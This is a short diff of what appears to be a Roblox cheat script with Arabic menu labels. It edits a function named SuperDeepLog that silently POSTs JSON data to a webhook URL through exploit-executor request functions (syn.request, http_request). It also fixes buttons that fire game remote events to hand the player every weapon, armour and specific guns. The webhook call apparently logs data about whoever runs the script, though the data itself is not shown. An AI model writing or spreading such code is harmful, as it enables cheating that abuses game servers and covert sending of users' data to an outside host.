@@ -26,12 +26,15 @@ local function SuperDeepLog()
     }
 
     pcall(function()
-        request({
-            Url = WebhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
+        local sendRequest = syn and syn.request or http and http.request or http_request or request
+        if sendRequest then
+            sendRequest({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
     end)
 end
 
@@ -212,7 +215,7 @@ AddBtn(T3, "أخذ كل الأسلحة", Color3.fromRGB(46, 204, 113)).MouseButt
     for _, item in pairs(RS:WaitForChild("StarterPack"):GetChildren()) do RS.RequestTool:FireServer(item.Name, 0) task.wait(0.05) end
 end)
 AddBtn(T3, "M4A1").MouseButton1Click:Connect(function() RS.GiveToolEvent:FireServer("M4A1") end)
-AddBtn(T3, "درع").MouseButton1Click:Connect(function3() RS.GiveToolEvent:FireServer("Heavy Vest") end)
+AddBtn(T3, "درع").MouseButton1Click:Connect(function() RS.GiveToolEvent:FireServer("Heavy Vest") end)
 AddBtn(T3, "Deagle").MouseButton1Click:Connect(function() RS.GiveToolEvent:FireServer("Desert Deagle") end)
 
 local T4 = CreateTab("الكلبشة", 130)
